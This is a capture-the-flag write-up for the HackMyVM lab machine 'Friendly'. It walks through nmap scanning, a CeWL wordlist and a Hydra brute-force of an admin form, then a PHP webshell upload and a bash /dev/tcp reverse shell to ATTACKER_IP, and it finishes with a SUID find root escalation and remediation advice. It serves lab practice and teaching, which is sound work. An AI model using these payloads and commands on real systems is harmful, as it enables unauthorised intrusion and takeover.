# Friendly — HackMyVM | Writeup

**Platform:** HackMyVM | **Difficulty:** Easy | **OS:** Linux

---

## Overview

| Phase | Technique |
|---|---|
| Reconnaissance | Nmap, Web Enumeration |
| Wordlist Generation | CeWL — website word scraping |
| Credential Brute-Force | Hydra — HTTP form attack |
| Foothold | Webshell Upload → Reverse Shell |
| Privilege Escalation | SUID `/usr/bin/find` |

---

## 1. Reconnaissance

### Network Discovery

```bash
nmap -sn 192.168.1.0/24
```

Identify the target IP, then run a full port scan:

```bash
nmap -sV -sC -p- --min-rate 5000 -oN friendly.nmap 192.168.1.X
```

**Results:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.x
80/tcp open  http    Apache httpd
22/tcp open  ssh     OpenSSH
```

### Web Enumeration

Visit `http://192.168.1.X` in the browser. The site has a login panel and content pages. Run directory discovery in parallel:

```bash
gobuster dir -u http://192.168.1.X -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

Notable findings: `/admin`, `/upload`, `index.html`

---

## 2. Wordlist Generation with CeWL

Instead of using a generic wordlist, scrape the target website itself to build a context-aware wordlist — site-specific words are likely reused as passwords.

```bash
cewl http://192.168.1.X -d 3 -m 5 -w friendly_wordlist.txt
```

| Flag | Meaning |
|---|---|
| `-d 3` | Crawl depth (3 levels) |
| `-m 5` | Minimum word length of 5 characters |
| `-w` | Output file |

Verify the wordlist:

```bash
wc -l friendly_wordlist.txt
cat friendly_wordlist.txt | head -20
```

---

## 3. Credential Brute-Force with Hydra

Inspect the login form (browser DevTools → Network tab) to identify:
- **POST URL:** `/admin/login.php`
- **Form fields:** `username`, `password`
- **Failure string:** e.g., `"Invalid credentials"`

```bash
hydra -l admin -P friendly_wordlist.txt 192.168.1.X http-post-form \
  "/admin/login.php:username=^USER^&password=^PASS^:Invalid credentials" \
  -t 30 -V
```

**Result:**

```
[80][http-post-form] host: 192.168.1.X   login: admin   password: Friendly
```

Log in with the discovered credentials.

---

## 4. Foothold — Webshell Upload

After logging in, locate a file upload feature. Upload a PHP webshell:

**shell.php:**
```php
<?php system($_GET['cmd']); ?>
```

Upload it, then verify remote code execution:

```
http://192.168.1.X/uploads/shell.php?cmd=id
```

Expected output: `uid=33(www-data) gid=33(www-data)`

### Upgrade to Reverse Shell

Start listener:

```bash
nc -lvnp 4444
```

Trigger the reverse shell via the webshell (URL-encoded):

```
http://192.168.1.X/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'
```

Stabilize the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

---

## 5. Privilege Escalation — SUID `/usr/bin/find`

### Enumerate SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Critical finding:**

```
/usr/bin/find
```

`find` has the SUID bit set and is owned by root. This is a well-known GTFOBins vector.

### Exploit

```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
```

The `-p` flag preserves the elevated (root) privileges from the SUID bit.

**Result:**

```
# whoami
root
# id
uid=33(www-data) gid=33(www-data) euid=0(root)
```

### Capture the Flag

```bash
cat /root/root.txt
cat /home/*/user.txt
```

---

## 6. Vulnerability Summary

| Vulnerability | Impact | Remediation |
|---|---|---|
| Weak/predictable password | Full admin panel access | Enforce strong password policy |
| Unrestricted file upload | Remote Code Execution | Whitelist extensions, disable PHP execution in upload dir |
| SUID on `/usr/bin/find` | Local Privilege Escalation → root | Remove SUID: `chmod u-s /usr/bin/find` |

---

## 7. Attack Chain Diagram

```
[Web Scrape] CeWL
      ↓
[Brute-Force] Hydra → admin:Friendly
      ↓
[Auth Bypass] Admin Panel Access
      ↓
[File Upload] PHP Webshell → RCE as www-data
      ↓
[Reverse Shell] www-data shell
      ↓
[SUID find] /usr/bin/find -exec /bin/sh -p
      ↓
[Root] ✓
```

---

## 8. Key Takeaways

- **CeWL** is highly effective against targets where admins reuse site-related words as passwords — always try it before generic wordlists.
- **Hydra** HTTP form attacks require precise identification of the POST parameters and failure string — use DevTools or Burp Suite to capture the exact request.
- **SUID misconfigurations** are one of the most common Linux privesc paths — always check with `find / -perm -4000` after gaining initial access.
- Consult [GTFOBins](https://gtfobins.github.io/gtfobins/find/) for a comprehensive reference on abusing SUID binaries like `find`, `vim`, `python`, etc.